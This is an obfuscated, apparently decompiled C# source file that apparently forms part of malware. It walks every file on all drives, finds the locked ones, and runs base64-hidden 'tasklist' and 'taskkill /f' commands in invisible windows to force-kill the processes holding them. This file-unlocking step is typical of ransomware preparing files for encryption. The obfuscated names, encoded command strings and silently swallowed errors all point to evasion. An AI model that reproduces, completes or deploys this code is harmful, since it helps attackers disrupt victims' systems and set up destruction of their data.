using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Text;

namespace dfbDZtGQEYGzK;

internal class jARNwzUwUMTWq
{
	[CompilerGenerated]
	private sealed class IvOzNsNMATiTQuE
	{
		public string OScUaePNgURnmAb;

		public bool _003CKillproc_003Eb__4(string t)
		{
			return t.Contains(OScUaePNgURnmAb);
		}
	}

	public static readonly List<string> xPjvAZsEAsr = new List<string>();

	public static readonly List<string> XwDatzRMxNX = new List<string>();

	public static void fXzprxZAVI()
	{
		try
		{
			DriveInfo[] drives = DriveInfo.GetDrives();
			foreach (DriveInfo driveInfo in drives)
			{
				if (driveInfo.IsReady)
				{
					gzFyKvctuFJo(driveInfo.Name);
				}
			}
		}
		catch (Exception)
		{
		}
	}

	public static void gzFyKvctuFJo(string yZYzukBKsbYAgtUj)
	{
		try
		{
			DirectoryInfo directoryInfo = new DirectoryInfo(yZYzukBKsbYAgtUj);
			FileInfo[] files = directoryInfo.GetFiles();
			foreach (FileInfo fileInfo in files)
			{
				try
				{
					xPjvAZsEAsr.Add(fileInfo.FullName);
				}
				catch (UnauthorizedAccessException)
				{
				}
			}
			DirectoryInfo[] directories = directoryInfo.GetDirectories();
			foreach (DirectoryInfo directoryInfo2 in directories)
			{
				try
				{
					gzFyKvctuFJo(directoryInfo2.FullName);
				}
				catch (UnauthorizedAccessException)
				{
				}
			}
		}
		catch
		{
		}
		if (xPjvAZsEAsr.Count <= 0)
		{
			return;
		}
		foreach (string item in xPjvAZsEAsr.Where((string bSbIIbHpMXRPDkg) => KioEuDUzlDg(bSbIIbHpMXRPDkg)))
		{
			XwDatzRMxNX.Add(item);
		}
		xPjvAZsEAsr.Clear();
		if (XwDatzRMxNX.Count <= 0)
		{
			return;
		}
		foreach (FileInfo item2 in XwDatzRMxNX.Select((string xfuuSkvTAmIDYfBwf) => new FileInfo(xfuuSkvTAmIDYfBwf)))
		{
			TLMMbRBqrsEJER(item2.Name);
		}
	}

	public static bool KioEuDUzlDg(string WtvEOzNKMXoZIB)
	{
		FileStream fileStream = null;
		try
		{
			fileStream = File.Open(WtvEOzNKMXoZIB, FileMode.Open, FileAccess.ReadWrite, FileShare.None);
		}
		catch (UnauthorizedAccessException)
		{
			try
			{
				fileStream = File.Open(WtvEOzNKMXoZIB, FileMode.Open, FileAccess.Read, FileShare.None);
			}
			catch (Exception)
			{
				return true;
			}
		}
		catch (Exception)
		{
			return true;
		}
		finally
		{
			fileStream.Close();
		}
		return false;
	}

	public static void TLMMbRBqrsEJER(string iEoLhtMHZXvhDK)
	{
		try
		{
			string text = feOzjMDvAa(sWSXzQkxHH.agZtqMkMayfivgE("dGFza2xpc3Q="), sWSXzQkxHH.agZtqMkMayfivgE("L3YgL2ZvIGNzdg=="));
			string[] separator = new string[1] { "\r\n" };
			string[] source = text.Split(separator, StringSplitOptions.None);
			List<string> list = (from t in source
				where t.Contains(iEoLhtMHZXvhDK)
				select t into izPKwfjsetSk
				select izPKwfjsetSk.Split(new char[1] { ',' }) into zjvkrDWvQPOAjr
				select zjvkrDWvQPOAjr[1].Replace("\"", "")).ToList();
			foreach (string item in list)
			{
				feOzjMDvAa(sWSXzQkxHH.agZtqMkMayfivgE("dGFza2tpbGw="), sWSXzQkxHH.agZtqMkMayfivgE("L2YgL3BpZCA=") + item);
			}
		}
		catch (Exception)
		{
		}
	}

	public static string feOzjMDvAa(string OOMvEdwnsdkcAJT, string IbatSadzSysYtFhR)
	{
		try
		{
			ProcessStartInfo processStartInfo = new ProcessStartInfo(OOMvEdwnsdkcAJT, IbatSadzSysYtFhR);
			processStartInfo.RedirectStandardOutput = true;
			processStartInfo.RedirectStandardError = true;
			processStartInfo.StandardOutputEncoding = Encoding.GetEncoding("UTF-8");
			processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			processStartInfo.UseShellExecute = false;
			processStartInfo.CreateNoWindow = true;
			Process process = Process.Start(processStartInfo);
			string text;
			using (StreamReader streamReader = process.StandardOutput)
			{
				text = streamReader.ReadToEnd();
			}
			string text2;
			using (StreamReader streamReader2 = process.StandardError)
			{
				text2 = streamReader2.ReadToEnd();
			}
			process.WaitForExit();
			return text2 + text;
		}
		catch (Exception ex)
		{
			return ex.Message + "\n<------------>\n" + ex.StackTrace;
		}
	}
}
